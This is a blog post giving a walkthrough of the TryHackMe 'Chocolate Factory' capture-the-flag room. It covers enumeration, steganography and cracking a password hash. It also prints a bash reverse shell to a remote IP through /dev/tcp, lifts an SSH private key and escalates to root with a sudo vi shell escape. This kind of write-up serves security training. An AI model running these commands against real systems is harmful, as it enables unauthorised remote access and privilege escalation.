---
layout: post
title: Chocolate Factory
date:   2025-09-30 11:00
description: TryHackMe chocolate factory CTF Write-Up
tags: tryhackme 
comments: false
---



We start of by enumerating the open ports with nmap

Looking at our output we see:
{% highlight bash %}
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
106/tcp open  pop3pw                                                                                                                                                                                        
109/tcp open  pop2                                                                                                                                                                                          
110/tcp open  pop3                                                                                                                                                                                          
111/tcp open  rpcbind                                                                                                                                                                                       
113/tcp open  ident                                                                                                                                                                                         
119/tcp open  nntp                                                                                                                                                                                          
125/tcp open  locus-map                     
{% endhighlight bash %}

![Battery Widget]({{ '/assets/images/batWid1.png' | relative_url }})


Running our Nmap scan with the -sCV flag shows us where to find "the key"

{% highlight bash %}
13/tcp open  ident?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, LDAPBindReq, NULL: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
{% endhighlight bash %}

Here we can see text that shows us the directory path of the secret key


**************2

Moving here on our webpage we can download the key_rev_key file
{% highlight bash %}
http://x.x.x.x/key_rev_key
{% endhighlight bash %}

**************3

Looking at this file we can see it's an elf file and already compiled

lets run the program:
{% highlight bash %}
./key_rev_key
{% endhighlight bash %}

permission denied - we will have to modify permissions

{% highlight bash %}
chmod +x key_rev_key
{% endhighlight bash %}

Now lets run it again

**************4

Looks like it's asking for a name


I tested willy, mrwonka,& Charlie but they all failed 


Lets run strings on the file for more clues

{% highlight bash %}
$ strings key_rev_key 
{% endhighlight bash %}


**************5

{% highlight bash %}
 congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 Keep its safe
{% endhighlight bash %}

Here we can see the key and the answer to quewstion #1

{% highlight bash %}
 congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
{% endhighlight bash %}


While we have the key we dont really know what this is used for yet
Lets keep enumerating the machine ...


_______________________________________________________________________



Lets move to port 21 and see if anonymous login is allowed

{% highlight bash %}
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
{% endhighlight bash %}


*************6



Anonymous is allowed ! 

Lets logon to the ftp server


********************7

We see 'gum_room.txt' file

Lets download this and inspect it

{% highlight bash %}
>> get gum_room.jpg
{% highlight bash %}

********************8


Running strings on the file doesn't show us much usefule output

Lets run steghide extract any hidden data
{% highlight bash %}
$ steghide extract -sf gun_room.jpg
(no password)
{% highlight bash %}

***********************9


We get our output in the b64.txt file
As the name suggests we have Base64 encoded data
Lets decode it here: 


(base64decode)[https://www.base64decode.org/]



We get what looks like a shadow file
At the very end we see the user Charlie and a password hash
Lets crack this hash
First lets see if an online cracker can crack this quickly

(hashes.com)[https://hashes.com/en/decrypt/hash]

It works and we get the password for Charlie !

***********************10

{% highlight bash %}
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824
{% highlight bash %}

This gives our answer to question 2 

_____________________________________________________

Lets see where we can use this username and password
SSH and FTP both failed to authenticate
Lets try and access the web server instead


***********************11

{% highlight bash %}
Charlie
cn7824
{% highlight bash %}


We are able to login successfully as Charlie
We see that there is immediately a command prompt box

***********************12


Lets build a reverse shell and start our netcat listener
(reverse-shell-cheat-sheet)[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]


.................

First on our attacker machine we will run the command:

{% highlight bash %}
$ nc -lvnp <port of choice>
{% highlight bash %}

Then in the command prompt of the web page we will put our reverse shell:

{% highlight bash %}
/bin/bash -c 'bash -i >& /dev/tcp/10.2.3.233/4444 0>&1'
{% highlight bash %}

***********************13


This gives us a shell back to our listener

But we only have www-data access


***********************14



It looks like the user flag is in charlie's home directory and we don't have access

Looking around we see a file called teleport and teleport.pub
Weird could these be public and private key files?

Opening this, we can see the private key inside: >"/home/charlie/teleport"

***********************15

Lets save this into a text file on our machine
Lets modify the permissions and see if we can get ssh access with these credentials

First copy and paste the entire private key file text onto your machine

Then run:
{% highlight bash %}
$ chmod +x <private_key_file>
{% highlight bash %}

Lets now try authenticate into ssh as Charlie

{% highlight bash %}
ssh -i id_rsa_file charlie@xxxx
{% highlight bash %}

We get access as Charlie !


***********************16

Lets capture that user flag

{% highlight bash %}
cat /home/charlie/user.txt
{% highlight bash %}

***********************17


# Priv Esc


We see sudo -l shows Charlie can run vi commands as root

***********************18

Looking for binary exploits we see a vi script:
(gtfobins/vi/#sudo)[https://gtfobins.github.io/gtfobins/vi/#sudo]

{% highlight bash %}
$ sudo vi -c ':!/bin/sh' /dev/null
{% highlight bash %}

Entering this command is successful
We get root access

***********************19

look like the root flag is contained within a python script:

{% highlight bash %}
./root.py
{% highlight bash %}

***********************20

Lets try an run it:
{% highlight bash %}
python3 ./root.py
{% highlight bash %}

***********************21

Looks like we need the key we found earlier

{% highlight bash %}
>b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
{% highlight bash %}

***********************22
 
Entering this we can now get the root flag and pwn this machine !!!
